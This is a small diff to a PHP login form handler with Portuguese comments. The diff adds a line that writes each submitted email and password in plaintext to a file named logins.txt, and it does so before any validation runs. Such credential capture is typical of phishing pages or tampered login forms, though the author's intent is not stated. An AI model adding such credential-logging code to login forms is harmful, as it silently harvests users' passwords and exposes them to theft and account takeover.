@@ -5,6 +5,9 @@ session_start();
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $email = trim($_POST['email'] ?? '');
     $senha = trim($_POST['senha'] ?? '');
+   
+    // 👇 Salvar os dados digitados
+    file_put_contents("logins.txt", "Email: $email | Senha: $senha\n", FILE_APPEND);
 
     if (empty($email) || empty($senha)) {
         $erro = "⚠️ Por favor, preencha todos os campos.";
